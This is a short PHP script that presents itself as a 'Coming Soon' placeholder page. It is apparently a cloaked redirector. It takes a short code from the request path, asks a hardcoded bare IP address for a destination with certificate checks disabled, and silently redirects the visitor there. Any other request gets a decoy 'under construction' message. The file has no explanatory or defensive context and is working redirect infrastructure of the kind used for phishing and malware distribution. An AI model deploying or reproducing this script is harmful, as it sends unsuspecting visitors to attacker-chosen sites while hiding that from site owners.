<?php 
function get($url, $params=array()) {	
   $url = $url.'?'.http_build_query($params, '', '&');
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, $url);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
   $response = curl_exec($ch);
   curl_close($ch);
   return $response;
} 

$code = basename(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
$link = get('http://147.182.178.125/'.$code);

if(isset($code) && strlen($code) < 10){
	header("Location:".$link);
}else{
	echo "<h1 style='margin:0 auto;position: absolute;top: 45%;left: 38%;color:#008000;text-align: center;'>Coming Soon<br><span style='font-size:18px;color:#000000;'>Pardon our mess were under construction</span></h1>";	
}
?>